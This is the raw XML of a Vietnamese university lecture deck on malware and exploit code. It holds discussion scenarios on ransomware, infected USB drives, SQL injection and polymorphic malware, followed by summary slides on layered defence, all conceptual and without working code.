          </a:p>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Gợi</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ý</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thảo luận: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Đây có thể là loại malware nào?</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Nhân viên cần làm gì ngay lúc đó?</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Doanh nghiệp có thể áp dụng biện pháp phòng ngừa nào?</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60489687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87332"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.8.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007001"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Tình</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huống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Tình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huống 2: Ransomware tống tiền</a:t>
            </a:r>
          </a:p>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công ty bị mã hóa toàn bộ dữ liệu máy chủ, trên màn hình hiện thông báo đòi tiền chuộc bằng Bitcoin.</a:t>
            </a:r>
          </a:p>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Gợi</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ý</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thảo luận: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Tại sao ransomware lại nguy hiểm và phổ biến?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Nếu là quản trị viên, bạn chọn trả tiền chuộc hay khôi phục hệ thống?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Cần chuẩn bị gì trước để giảm thiểu thiệt hại?</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53366410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87332"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.8.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007001"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Tình</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huống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Tình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huống 3: USB nhiễm mã độc</a:t>
            </a:r>
          </a:p>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Sinh viên mang USB từ quán photocopy về, cắm vào máy tính trường học. Sau đó, hệ thống bị lây lan malware.</a:t>
            </a:r>
          </a:p>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Gợi</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ý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Đây là kỹ thuật phát tán nào?</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Làm thế nào để hạn chế rủi ro từ USB?</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Có thể thay thế USB bằng công nghệ nào an toàn hơn?</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87484293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87332"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.8.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007001"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Tình</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huống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Tình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huống 4: Lỗ hổng phần mềm chưa vá</a:t>
            </a:r>
          </a:p>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website thương mại điện tử chưa cập nhật bản vá bảo mật. Hacker khai thác lỗ hổng SQL Injection để cài backdoor.</a:t>
            </a:r>
          </a:p>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Gợi</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ý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Đây có phải là “mã khai thác” không?</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 tiềm ẩn nếu hacker duy trì truy cập?</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Nếu bạn là DevOps, bạn sẽ xử lý thế nào để tránh tình trạng này?</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61265729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87332"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.8.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07001"/>
            <a:ext cx="10242645" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Tình</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huống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Tình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huống 5: Malware biến hình (Polymorphic)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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công ty an ninh mạng phát hiện malware tự động thay đổi mã khi lây lan, khiến antivirus khó phát hiện.</a:t>
            </a:r>
          </a:p>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Câu hỏi thảo luận:</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Tại sao kỹ thuật polymorphism lại hiệu quả?</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giải pháp phát hiện hành vi (behavior-based detection) có thể giúp gì?</a:t>
            </a:r>
          </a:p>
          <a:p>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Theo bạn, AI/ML có thể là hướng đi mới để chống lại malware loại này không?</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26438736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624084" y="-134337"/>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smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="300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624084" y="809683"/>
            <a:ext cx="10222173" cy="4372169"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Nhận thức cơ bản:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hiểu rõ khái niệm malware và exploit code là nền tảng để nắm bắt các kỹ thuật tấn công hiện đại.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. Sự đa dạng và nguy hiểm:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Mã độc có nhiều loại (virus, worm, trojan, ransomware…), kết hợp với exploit tạo ra các cuộc tấn công tinh vi, khó phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3. Quy trình tấn công:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Từ phát hiện lỗ hổng → phát triển exploit → triển khai → duy trì truy cập → che giấu dấu vết → tạo nên vòng đời tấn công hoàn chỉnh.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600"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0625611">
            <a:off x="7854217" y="4251463"/>
            <a:ext cx="2678761" cy="267876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rot="1338607" flipH="1">
            <a:off x="-148800" y="161130"/>
            <a:ext cx="2684499" cy="2684499"/>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rot="1213697">
            <a:off x="-187116" y="4214343"/>
            <a:ext cx="2610148" cy="2610148"/>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rot="20451125">
            <a:off x="3057223" y="4330202"/>
            <a:ext cx="2521285" cy="2521285"/>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rot="19608170">
            <a:off x="5853168" y="5075331"/>
            <a:ext cx="1676539" cy="1676539"/>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rot="20520790">
            <a:off x="10739420" y="3874822"/>
            <a:ext cx="1156703" cy="1156703"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="203718721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624084" y="-134337"/>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="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624084" y="809683"/>
            <a:ext cx="10222173" cy="4372169"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ thuật che giấu &amp; phát tán:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Polymorphism, metamorphism, obfuscation… cùng các kênh P2P, email, website độc hại khiến malware ngày càng khó phòng thủ.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>5. Tác động thực tế:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Malware không chỉ tấn công ứng dụng mà còn chiếm quyền hệ thống, gây rò rỉ dữ liệu, gián đoạn dịch vụ và thiệt hại kinh tế.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>6. Phòng chống &amp; ứng phó:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Áp dụng phòng thủ nhiều lớp: antivirus, IDS/IPS, firewall, cập nhật bản vá, kiểm soát hành vi, cùng với nâng cao nhận thức người dùng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600"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0625611">
            <a:off x="7854217" y="4251463"/>
            <a:ext cx="2678761" cy="267876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rot="1338607" flipH="1">
            <a:off x="-148800" y="161130"/>
            <a:ext cx="2684499" cy="2684499"/>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rot="1213697">
            <a:off x="-187116" y="4214343"/>
            <a:ext cx="2610148" cy="2610148"/>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rot="20451125">
            <a:off x="3057223" y="4330202"/>
            <a:ext cx="2521285" cy="2521285"/>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rot="19608170">
            <a:off x="5853168" y="5075331"/>
            <a:ext cx="1676539" cy="1676539"/>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rot="20520790">
            <a:off x="10739420" y="3874822"/>
            <a:ext cx="1156703" cy="1156703"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="80591055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787325_Lab safety_AAS_v3" id="{898BC5E2-691B-4B41-A97D-F35AD4FFF20D}" vid="{295F60D3-032D-43CA-A300-E4752067AD50}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Crop">
  <a:themeElements>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fontScheme name="Custom 9">
      <a:majorFont>
        <a:latin typeface="Impact"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="Arial"/>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TF22874644_Trading cards_AAS_v3" id="{4E496154-558D-4612-A753-0794614ED79B}" vid="{A8FAAD10-755F-4F52-9B7F-8A15476B6C2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604BA817-A03C-4EA3-86C4-6E42BD37F523}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{19E59094-1E6F-42D5-A62B-D0344AFFF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0096A91-93C8-4C7A-BF68-944591874A6D}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="16c05727-aa75-4e4a-9b5f-8a80a1165891"/>
    <ds:schemaRef ds:uri="71af3243-3dd4-4a8d-8c0d-dd76da1f02a5"/>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControl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Lab safety</Template>
  <TotalTime>0</TotalTime>
  <Words>5454</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>466</Paragraphs>
  <Slides>53</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53</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="64" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Bookman Old Style</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Franklin Gothic Book</vt:lpstr>
      <vt:lpstr>Impact</vt:lpstr>
      <vt:lpstr>Rockwell</vt:lpstr>
      <vt:lpstr>Segoe UI Emoji</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Crop</vt:lpstr>
      <vt:lpstr> Bảo mật  Ứng dụng và Hệ thống</vt:lpstr>
      <vt:lpstr>BẢO MẬT ỨNG DỤNG VÀ HỆ THỐNG   CSE702005-1-1-25 (N03)</vt:lpstr>
      <vt:lpstr>BÀI 6: MÃ ĐỘC VÀ MÃ KHAI THÁC</vt:lpstr>
      <vt:lpstr>6.1. Khái niệm Mã độc và Mã khai thác</vt:lpstr>
      <vt:lpstr>6.1. Khái niệm Mã độc và Mã khai thác</vt:lpstr>
      <vt:lpstr>6.1. Khái niệm Mã độc và Mã khai thác</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.2. Các loại Mã độc và Mã khai thác phổ biến</vt:lpstr>
      <vt:lpstr>6.3. Quy trình khai thác lỗ hổng bằng Exploit Code</vt:lpstr>
      <vt:lpstr>6.3. Quy trình khai thác lỗ hổng bằng Exploit Code</vt:lpstr>
      <vt:lpstr>6.3. Quy trình khai thác lỗ hổng bằng Exploit Code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6.4. Kỹ thuật phát tán &amp; che giấu của Malware</vt:lpstr>
      <vt:lpstr>6.5. Tấn công ứng dụng sử dụng Malware </vt:lpstr>
      <vt:lpstr>6.5. Tấn công ứng dụng sử dụng Malware </vt:lpstr>
      <vt:lpstr>6.5. Tấn công ứng dụng sử dụng Malware </vt:lpstr>
      <vt:lpstr>6.6. Tấn công Hệ thống sử dụng mã độc </vt:lpstr>
      <vt:lpstr>6.6. Tấn công Hệ thống sử dụng mã độc </vt:lpstr>
      <vt:lpstr>6.6. Tấn công Hệ thống sử dụng mã độc </vt:lpstr>
      <vt:lpstr>6.6. Tấn công Hệ thống sử dụng mã độc </vt:lpstr>
      <vt:lpstr>6.6. Tấn công Hệ thống sử dụng mã độc </vt:lpstr>
      <vt:lpstr>6.7. Biện pháp phòng chống tấn công mã độc </vt:lpstr>
      <vt:lpstr>6.7. Biện pháp phòng chống tấn công mã độc </vt:lpstr>
      <vt:lpstr>6.7. Biện pháp phòng chống tấn công mã độc </vt:lpstr>
      <vt:lpstr>6.7. Biện pháp phòng chống tấn công mã độc </vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>6.8. Thảo luận</vt:lpstr>
      <vt:lpstr>Những nội dung cần lưu ý:</vt:lpstr>
      <vt:lpstr>Những nội dung cần lưu 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2025-08-05T15:12:50Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-06T15:16:37Z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